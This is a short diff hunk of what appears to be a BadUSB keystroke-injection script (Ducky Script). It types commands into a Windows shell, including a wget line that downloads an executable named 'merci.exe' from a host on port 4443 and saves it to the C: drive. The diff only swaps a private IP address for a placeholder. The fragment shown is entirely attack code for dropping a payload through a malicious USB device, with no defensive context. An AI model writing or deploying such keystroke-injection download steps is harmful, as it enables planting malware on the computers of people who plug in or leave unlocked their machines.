@@ -7,7 +7,7 @@ STRING cd c:/
 DELAY 500
 ENTER
 DELAY 800
-STRING wget "http://192.168.1.14:4443/merci.exe" -OutFile "C:\merci.exe"
+STRING wget "http://LOCALip:4443/merci.exe" -OutFile "C:\merci.exe"
 DELAY 500
 ENTER
 DELAY 800
